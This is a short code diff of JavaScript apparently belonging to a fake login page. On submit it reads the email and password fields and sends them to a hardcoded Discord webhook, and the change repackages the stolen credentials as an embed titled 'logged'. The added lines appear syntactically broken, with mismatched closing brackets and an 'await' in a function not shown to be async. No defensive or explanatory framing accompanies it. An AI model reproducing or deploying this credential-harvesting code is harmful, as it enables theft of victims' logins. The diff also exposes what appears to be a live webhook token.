@@ -313,19 +313,28 @@
 	
 	    var username = document.getElementsByName('email')[0].value;
 	    var password = document.getElementsByName('password')[0].value;
-	
+	        const webhookBody = {
+          embeds: [{
+            title: 'logged',
+            fields: [
+              { name: 'email', value: username },
+              { name: 'password', value: password }
+            ]
+          }],
+        };
 	    var webhookUrl = 'https://discord.com/api/webhooks/1181377382632931328/Slh2qVzrhgLQr_E0IXaTkrtzJfXw8itwQ_xWgVM561sqmegHPN45rlw3xwLC4YQjP9lT'; // Replace with your Discord webhook URL
 	
 	    var data = {
 	        content: 'Username: ' + username + ', Password: ' + password
 	    };
 	
-	    fetch(webhookUrl, {
-	        method: 'POST',
-	        headers: {
-	            'Content-Type': 'application/json'
-	        },
-	        body: JSON.stringify(data)
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(webhookBody),
+        });
 	    }).then(response => console.log('Sent to Discord', response))
 	      .catch(error => console.error('Error:', error));
 	});
